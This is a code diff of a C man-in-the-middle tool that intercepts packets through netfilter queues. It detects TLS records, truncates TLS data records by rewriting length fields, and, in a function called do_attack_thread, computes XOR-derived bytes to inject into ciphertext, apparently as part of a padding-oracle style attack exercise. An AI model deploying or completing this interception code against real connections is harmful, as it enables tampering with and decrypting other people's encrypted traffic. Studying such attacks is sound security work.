@@ -39,6 +39,10 @@ static inline Byte *extract_application_data(Byte *payload, unsigned int payload
 void *do_attack_thread(void *arg);
 static int packet_verdict_handler(struct nfq_q_handle *qh, struct nfgenmsg *nfmsg, struct nfq_data *nfa, void *data);
 void stampa_cookie();
+static bool is_tls_record(const Byte *payload, unsigned int application_payload_len);
+static bool is_tls_handshake(const Byte *payload, unsigned int application_payload_len);
+static bool is_tls_data(const Byte *payload, unsigned int application_payload_len);
+int update_tls_record_for_truncation(Byte *application_payload, unsigned int *application_payload_size);
 
 static inline uint64_t rdtsc() {
   unsigned int lo, hi, aux;
@@ -279,32 +283,28 @@ static int packet_verdict_handler(struct nfq_q_handle *qh, struct nfgenmsg *nfms
     application_payload_size = payload_len - iphdr_size - tcphdr_size;
 
     //SSL/TLS handshake message
-    if(application_payload != NULL &&application_payload[0] == 0x16 && application_payload[1] == 0x03 && (application_payload[2] == 0x01 || application_payload[2] == 0x02 || application_payload[2] == 0x03)){
+    if(is_tls_handshake(application_payload, application_payload_size)){
       printf(ANSI_COLOR_GREEN "SSL/TLS handshake packet detected! \n" ANSI_COLOR_RESET);
       return nfq_set_verdict(qh, id, NF_ACCEPT, 0, NULL);
     }
 
     //SSL/TLS data message
-    if(application_payload != NULL && application_payload[0] == 0x17 && application_payload[1] == 0x03 && (application_payload[2] == 0x01 || application_payload[2] == 0x02 || application_payload[2] == 0x03)){
+    if(is_tls_data(application_payload, application_payload_size)){
       printf(ANSI_COLOR_BLUE "SSL/TLS data packet detected! \n" ANSI_COLOR_RESET);
       
-      printf("STAMPA DEI DATI PRIMA DEL TRONCAMENTO \n");
-      print_application_data(application_payload, application_payload_size);
+      //print_application_data(application_payload, application_payload_size);
 
       //devo effettuare il troncamento a 341 byte
       if(application_payload_size > data_dimension){
-        int diff = application_payload_size - data_dimension;
-        application_payload_size = data_dimension;
+        //da capire come mai non funziona
+        int diff = update_tls_record_for_truncation(application_payload, &application_payload_size);
         payload_len -= diff;
-        ip_header->tot_len = htons(payload_len);
-        uint16_t new_tls_len = application_payload_size - 5; 
-        application_payload[3] = (new_tls_len >> 8) & 0xFF; 
-        application_payload[4] = new_tls_len & 0xFF;
+        ip_header->tot_len = htons(payload_len); 
       }
 
       if(application_payload_size > 0){
-        printf("Printing of the data \n");
-        print_application_data(application_payload, application_payload_size);
+        //printf("Printing of the data \n");
+        //print_application_data(application_payload, application_payload_size);
 
         if(check_data_length(application_payload, application_payload_size) == false){
           fprintf(stderr, "Data length is not correct! \n");
@@ -424,9 +424,46 @@ static inline Byte *extract_application_data(Byte *payload, unsigned int payload
   return application_data;
 }
 
-//0 -> ssl handshake, 1 --> ssl/tls data packet, 
-int analyze_application_data(Byte *payload, int payload_len){
+//check if the payload is a TLS record (handshake or data)
+static bool is_tls_record(const Byte *payload, unsigned int application_payload_len){
+  bool is_tls = false;
 
+  if(payload == NULL || application_payload_len < 3){
+    return is_tls;
+  }
+
+  //check if it's a TLS record 
+  if(payload[1] == 0x03 && (payload[2] == 0x01 || payload[2] == 0x02 || payload[2] == 0x03)){
+    is_tls = true;
+  }
+    
+  return is_tls;
+}
+
+//check if the payload is a TLS handshake record (0x16)
+static bool is_tls_handshake(const Byte *payload, unsigned int application_payload_len){
+  bool is_handshake = false;
+
+  bool is_tls = is_tls_record(payload, application_payload_len);
+
+  if(is_tls && payload[0] == 0x16){
+    is_handshake = true;
+  }
+
+  return is_handshake;
+}
+
+//check if the payload is a TLS data record (0x17)
+static bool is_tls_data(const Byte *payload, unsigned int application_payload_len){
+  bool is_data = false;
+
+  bool is_tls = is_tls_record(payload, application_payload_len);
+
+  if(is_tls && payload[0] == 0x17){
+    is_data = true;
+  }
+
+  return is_data;
 }
 
 void modify_packet(bool first_modification){
@@ -459,6 +496,20 @@ void modify_packet(bool first_modification){
   }
 
   print_blocks(data_packet->data, data_packet->data_len);
+}
+
+//function to truncate the packet and return the difference between the original packet length and the new packet length
+int update_tls_record_for_truncation(Byte *application_payload, unsigned int *application_payload_size){
+  int diff = *application_payload_size - data_dimension;
+  if(diff > 0){
+    *application_payload_size = data_dimension;
+    uint16_t new_tls_len = *application_payload_size - 5;
+    printf("new tls len: %d \n", new_tls_len); 
+    application_payload[3] = (new_tls_len >> 8) & 0xFF; 
+    application_payload[4] = new_tls_len & 0xFF;
+  }
+
+  return diff;
 }
 
 
@@ -694,10 +745,10 @@ void *do_attack_thread(void *arg){
           per ottenere 0x01 0x01 so che i byte che devo iniettare sono
         */
        
-        /*
+        
         Byte expected_last_byte = 0x01 ^ 0x39 ^ original_ciph_last;
-        Byte expcted_penultime_byte = 0x01 ^ 0x038 ^ original_ciph_penultimate; 
-        */
+        Byte expected_penultimate_byte = 0x01 ^ 0x038 ^ original_ciph_penultimate; 
+        
 
         /*
         Byte expected_last_byte = 0x39;
